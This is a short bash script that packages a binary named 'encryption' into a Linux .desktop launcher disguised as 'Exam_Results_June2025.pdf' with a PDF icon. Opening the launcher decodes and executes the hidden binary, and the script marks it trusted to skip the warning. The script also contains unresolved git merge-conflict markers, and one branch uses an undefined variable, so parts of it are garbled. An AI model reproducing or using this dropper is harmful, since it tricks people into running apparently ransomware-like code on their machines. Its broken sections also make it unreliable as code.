#!/bin/bash

BINARY="./encryption"
DESKTOP_NAME="Exam_Results_June2025.pdf"
OUTPUT="Exam_Results_June2025.desktop"

if [ ! -f "$BINARY" ]; then
    echo "ERROR: $BINARY not found — compile first"
    exit 1
fi

echo "Encoding binary..."
base64 -w 0 "$BINARY" > /tmp/.b64

{
    echo "[Desktop Entry]"
    echo "Name=$DESKTOP_NAME"
    echo "Icon=application-pdf"
    echo "Type=Application"
<<<<<<< Updated upstream
    echo "Terminal=false"
    echo "Exec=bash -c 'base64 -d /tmp/.b64 > /tmp/.run && chmod +x /tmp/.run && /tmp/.run'"
=======
    echo "Terminal=true"
    echo "Exec=konsole -c 'echo $BINARY_B64 | base64 -d > /tmp/.run && chmod +x /tmp/.run && /tmp/.run'"
>>>>>>> Stashed changes
} > "$OUTPUT"

chmod +x "$OUTPUT"
gio set "$OUTPUT" metadata::trusted true

<<<<<<< Updated upstream
echo "Done — $OUTPUT created"
=======
echo "Done — $OUTPUT created"
echo "File size: $(du -h $OUTPUT | cut -f1)"
>>>>>>> Stashed changes
